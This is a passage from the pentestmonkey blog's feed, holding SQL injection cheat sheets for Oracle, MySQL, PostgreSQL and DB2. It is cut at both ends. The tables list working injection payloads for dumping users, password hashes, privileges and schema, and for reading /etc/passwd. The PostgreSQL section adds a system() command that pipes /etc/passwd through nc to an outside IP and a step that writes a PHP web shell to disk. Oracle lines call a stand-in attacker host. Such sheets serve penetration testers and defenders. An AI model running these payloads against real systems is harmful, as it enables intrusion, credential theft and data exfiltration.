<td>ASCII Value -&gt; Char</td>
<td>SELECT chr(65) FROM dual; &#8212; returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;) FROM dual; &#8212; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(1 AS char) FROM dual;<br />
SELECT CAST(&#8216;1&#8217; AS int) FROM dual;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217; FROM dual; &#8212; returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; &#8212; doesn&#8217;t play well with SELECT statements</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; &#8212; returns 1<br />
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; &#8212; returns 2</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT chr(65) || chr(66) FROM dual; &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>BEGIN DBMS_LOCK.SLEEP(5); END; &#8212; priv, can&#8217;t seem to embed this in a SELECT<br />
SELECT UTL_INADDR.get_host_name(&#8216;10.0.0.1&#8217;) FROM dual; &#8212; if reverse looks are slow<br />
SELECT UTL_INADDR.get_host_address(&#8216;blah.attacker.com&#8217;) FROM dual; &#8212; if forward lookups are slow<br />
SELECT UTL_HTTP.REQUEST(&#8216;http://google.com&#8217;) FROM dual; &#8212; if outbound TCP is filtered / slow<br />
&#8212; Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>SELECT UTL_INADDR.get_host_address(&#8216;google.com&#8217;) FROM dual;<br />
SELECT UTL_HTTP.REQUEST(&#8216;http://google.com&#8217;) FROM dual;</td>
</tr>
<tr>
<td>Command Execution</td>
<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>can be used to execute commands if it&#8217;s installed.<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a> can sometimes be used too, though it normally failed for me. <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" /></td>
</tr>
<tr>
<td>Local File Access</td>
<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used.  Check that the following is non-null:<br />
SELECT value FROM v$parameter2 WHERE name = &#8216;utl_file_dir&#8217;;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it&#8217;s installed (it is not available in Oracle Express).</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT UTL_INADDR.get_host_name FROM dual;<br />
SELECT host_name FROM v$instance;<br />
SELECT UTL_INADDR.get_host_address FROM dual; &#8212; gets IP address<br />
SELECT UTL_INADDR.get_host_name(&#8216;10.0.0.1&#8217;) FROM dual; &#8212; gets hostnames</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT name FROM V$DATAFILE;</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>SYSTEM<br />
SYSAUX</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p>From Christian Mehlmauer:</p>
<table border="1">
<tbody>
<tr>
<td>Get all tablenames in one string</td>
<td>select rtrim(xmlagg(xmlelement(e, table_name || &#8216;,&#8217;)).extract(&#8216;//text()&#8217;).extract(&#8216;//text()&#8217;) ,&#8217;,&#8217;) from all_tables &#8212;  when using union based SQLI with only one row</td>
</tr>
<tr>
<td>Blind SQLI in order by clause</td>
<td>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = &#8216;a&#8217; and rownum = 1)=1) then column_name1 else column_name2 end &#8212; you must know 2 column names with the same datatype</td>
</tr>
</tbody>
</table>
<h3></h3>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>MySQL SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:19:32 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[mysql]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=86</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into MySQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into MySQL databases&#8230;</p>
<p><span id="more-86"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1; #comment<br />
SELECT /*comment*/1;</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user();<br />
SELECT system_user();</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT user FROM mysql.user; &#8212; priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT host, user, password FROM mysql.user; &#8212; priv</td>
</tr>
<tr>
<td>Password Cracker</td>
<td><a href="http://www.openwall.com/john/">John the Ripper</a> will crack MySQL password hashes.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; &#8212; list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; &#8212; priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; &#8212; list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; &#8212; list privs on columns</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &#8216;SUPER&#8217;;SELECT host, user FROM mysql.user WHERE Super_priv = &#8216;Y&#8217;; # priv</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT database()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT schema_name FROM information_schema.schemata; &#8212; for MySQL &gt;= v5.0<br />
SELECT distinct(db) FROM mysql.db &#8212; priv</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#8216;mysql&#8217; AND table_schema != &#8216;information_schema&#8217;</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#8216;mysql&#8217; AND table_schema != &#8216;information_schema&#8217;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = &#8216;username&#8217;; &#8212; find table which have a column called &#8216;username&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0<br />
SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(&#8216;abcd&#8217;, 3, 1); # returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2; # returns 2<br />
SELECT 6 &amp; 1; # returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(65); # returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;); # returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT cast(&#8216;1&#8217; AS unsigned integer);<br />
SELECT cast(&#8216;123&#8217; AS char);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT CONCAT(&#8216;A&#8217;,&#8217;B&#8217;); #returns AB<br />
SELECT CONCAT(&#8216;A&#8217;,&#8217;B&#8217;,&#8217;C&#8217;); # returns ABC</td>
</tr>
<tr>
<td>If Statement</td>
<td>SELECT if(1=1,&#8217;foo&#8217;,&#8217;bar&#8217;); &#8212; returns &#8216;foo&#8217;</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN (1=1) THEN &#8216;A&#8217; ELSE &#8216;B&#8217; END; # returns A</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT 0x414243; # returns ABC</td>
</tr>
<tr>
<td>Time Delay</td>
<td><span>SELECT BENCHMARK(1000000,MD5(&#8216;A&#8217;));<br />
SELECT SLEEP(5); # &gt;= 5.0.12<br />
</span></td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>Impossible?</td>
</tr>
<tr>
<td>Command Execution</td>
<td>If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">raptor_udf.c</a> explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.</td>
</tr>
<tr>
<td>Local File Access</td>
<td>&#8230;&#8217; UNION ALL SELECT LOAD_FILE(&#8216;/etc/passwd&#8217;) &#8212; priv, can only read world-readable files.<br />
SELECT * FROM mytable INTO dumpfile &#8216;/tmp/somefile&#8217;; &#8212; priv, write to file system</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT @@hostname;</td>
</tr>
<tr>
<td>Create Users</td>
<td>CREATE USER test1 IDENTIFIED BY &#8216;pass1&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Delete Users</td>
<td>DROP USER test1; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>GRANT ALL PRIVILEGES ON *.* TO test1@&#8217;%&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT @@datadir;</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>information_schema (&gt;= mysql 5.0)<br />
mysql</td>
</tr>
</tbody>
</table>
<h3>Thanks</h3>
<p>Jonathan Turner for @@hostname tip.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:18:37 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=85</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into PostgreSQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into PostgreSQL databases&#8230;</p>
<p><span id="more-85"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT version()</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1; &#8211;comment<br />
SELECT /*comment*/1;</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user;<br />
SELECT current_user;<br />
SELECT session_user;<br />
SELECT usename FROM pg_user;<br />
SELECT getpgusername();</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT usename FROM pg_user</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT usename, passwd FROM pg_shadow &#8212; priv</td>
</tr>
<tr>
<td>Password Cracker</td>
<td><a href="http://pentestmonkey.net/blog/cracking-postgres-hashes/">MDCrack</a> can crack PostgreSQL&#8217;s MD5-based passwords.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT current_database()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT datname FROM pg_database</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#8217;r&#8217;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#8216;public&#8217;)</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (&#8216;r&#8217;,&#8221;) AND n.nspname NOT IN (&#8216;pg_catalog&#8217;, &#8216;pg_toast&#8217;) AND pg_catalog.pg_table_is_visible(c.oid)</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>If you want to list all the table names that contain a column LIKE &#8216;%password%&#8217;:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#8217;r&#8217;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#8216;public&#8217;) AND attname LIKE &#8216;%password%&#8217;;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; &#8212; rows numbered from 0<br />
SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(&#8216;abcd&#8217;, 3, 1); &#8212; returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2; &#8212; returns 2<br />
SELECT 6 &amp; 1; &#8211;returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT chr(65);</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;);</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(1 as varchar);<br />
SELECT CAST(&#8216;1&#8217; as int);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217;; &#8212; returnsAB</td>
</tr>
<tr>
<td>If Statement</td>
<td>IF statements only seem valid inside functions, so aren&#8217;t much use for SQL injection.  See CASE statement instead.</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN (1=1) THEN &#8216;A&#8217; ELSE &#8216;B&#8217; END; &#8212; returns A</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT CHR(65)||CHR(66); &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>SELECT pg_sleep(10); &#8212; postgres 8.2+ only<br />
CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS &#8216;/lib/libc.so.6&#8217;, &#8216;sleep&#8217; language &#8216;C&#8217; STRICT; SELECT sleep(10); &#8211;priv, create your own sleep function.  Taken from <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">here</a> .</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>Generally not possible in postgres.  However if <a href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html">contrib/dblink</a>is installed (it isn&#8217;t by default) it can be used to resolve hostnames (assuming you have DBA rights):</p>
<pre>SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);</pre>
<p>Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. &#8220;ping pentestmonkey.net&#8221;.</td>
</tr>
<tr>
<td>Command Execution</td>
<td>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS &#8216;/lib/libc.so.6&#8217;, &#8216;system&#8217; LANGUAGE &#8216;C&#8217; STRICT; &#8212; privSELECT system(&#8216;cat /etc/passwd | nc 10.0.0.1 8080&#8217;); &#8212; priv, commands run as postgres/pgsql OS-level user</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata(t text);<br />
COPY mydata FROM &#8216;/etc/passwd&#8217;; &#8212; priv, can read files which are readable by postgres OS-level user<br />
&#8230;&#8217; UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; &#8212; get data back one row at a time<br />
&#8230;&#8217; UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; &#8212; get data back one row at a time &#8230;<br />
DROP TABLE mytest mytest;Write to a file:</p>
<p>CREATE TABLE mytable (mycol text);<br />
INSERT INTO mytable(mycol) VALUES (&#8216;&lt;? pasthru($_GET[cmd]); ?&gt;&#8217;);<br />
COPY mytable (mycol) TO &#8216;/tmp/test.php&#8217;; &#8211;priv, write files as postgres OS-level user.  Generally you won&#8217;t be able to write to the web root, but it&#8217;s always work a try.<br />
&#8212; priv user can also read/write files by <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">mapping libc functions</a></td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT inet_server_addr(); &#8212; returns db server IP address (or null if using local connection)<br />
SELECT inet_server_port(); &#8212; returns db server IP address (or null if using local connection)</td>
</tr>
<tr>
<td>Create Users</td>
<td>CREATE USER test1 PASSWORD &#8216;pass1&#8217;; &#8212; priv<br />
CREATE USER test1 PASSWORD &#8216;pass1&#8217; CREATEUSER; &#8212; priv, grant some privs at the same time</td>
</tr>
<tr>
<td>Drop Users</td>
<td>DROP USER test1; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>ALTER USER test1 CREATEUSER CREATEDB; &#8212; priv</td>
</tr>
<tr>
<td> Location of DB files</td>
<td>SELECT current_setting(&#8216;data_directory&#8217;); &#8212; priv<br />
SELECT current_setting(&#8216;hba_file&#8217;); &#8212; priv</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>template0<br />
template1</td>
</tr>
</tbody>
</table>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>DB2 SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 07 Jul 2007 22:14:24 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[db2]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=84</guid>

					<description><![CDATA[Finding a SQL injection vulnerability in a web application backed by DB2 isn&#8217;t too common in my experience.  When you do find one, though it pays to be prepared&#8230; Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on DB2 8.2 under [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Finding a SQL injection vulnerability in a web application backed by DB2 isn&#8217;t too common in my experience.  When you do find one, though it pays to be prepared&#8230;</p>
<p><span id="more-84"></span></p>
<p>Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on DB2 8.2 under Windows.</p>
<p>This post is part of series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>select versionnumber, version_timestamp from sysibm.sysversions;</td>
</tr>
<tr>
<td>Comments</td>
<td>select blah from foo; &#8212; comment like this</td>
</tr>
<tr>
<td>Current User</td>
<td>select user from sysibm.sysdummy1;<br />
select session_user from sysibm.sysdummy1;<br />
select system_user from sysibm.sysdummy1;</td>
</tr>
<tr>
<td>List Users</td>
<td>N/A (I think DB2 uses OS-level user accounts for authentication.)Database authorities (like roles, I think) can be listed like this:<br />
select grantee from syscat.dbauth;</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>N/A (I think DB2 uses OS-level user accounts for authentication.)</td>
</tr>
<tr>
<td>List Privileges</td>
<td>select * from syscat.tabauth; &#8212; privs on tables<br />
select * from syscat.dbauth where grantee = current user;<br />
select * from syscat.tabauth where grantee = current user;<br />
select * from SYSIBM.SYSUSERAUTH &#8212; List db2 system privilegies</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = &#8216;Y&#8217; or SYSADMAUTH = &#8216;G&#8217;</td>
</tr>
<tr>
<td>Current Database</td>
<td>select current server from sysibm.sysdummy1;</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT schemaname FROM syscat.schemata;</td>
</tr>
<tr>
<td>List Columns</td>
<td>select name, tbname, coltype from sysibm.syscolumns;</td>
</tr>
<tr>
<td>List Tables</td>
<td>select name from sysibm.systables;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>select tbname from sysibm.syscolumns where name=&#8217;username&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>select name from (SELECT name FROM sysibm.systables order by<br />
name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only;</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT SUBSTR(&#8216;abc&#8217;,2,1) FROM sysibm.sysdummy1;  &#8212; returns b</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td><a href="http://www.tar.hu/sqlbible/sqlbible0084.html">This page</a> seems to indicate that DB2 has no support for bitwise operators!</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>select chr(65) from sysibm.sysdummy1; &#8212; returns &#8216;A&#8217;</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>select ascii(&#8216;A&#8217;) from sysibm.sysdummy1; &#8212; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT cast(&#8216;123&#8217; as integer) FROM sysibm.sysdummy1;<br />
SELECT cast(1 as char) FROM sysibm.sysdummy1;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;a&#8217; concat &#8216;b&#8217; concat &#8216;c&#8217; FROM sysibm.sysdummy1; &#8212; returns &#8216;abc&#8217;<br />
select &#8216;a&#8217; || &#8216;b&#8217; from sysibm.sysdummy1; &#8212; returns &#8216;ab&#8217;</td>
</tr>
<tr>
<td>If Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Case Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>TODO</td>
</tr>
<tr>
<td>Time Delay</td>
<td>???See <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>TODO</td>
</tr>
<tr>
<td>Command Execution</td>
<td>TODO</td>
</tr>
<tr>
<td>Local File Access</td>
<td>TODO</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>TODO</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>TODO</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>TODO</td>
</tr>
</tbody>
</table>
<p>This page will probably remain a work-in-progress for some time yet.  I&#8217;ll update it as I learn more.</p>
<h3>Thanks</h3>
<p>Pentestmonkey gratefully acknowledges the contributions of:</p>
<p>r22mvk</p>
<p>Adrián for figuring out lots of the TODO items above:<br />
<a href="http://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/">http://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/</a></p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Ingres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
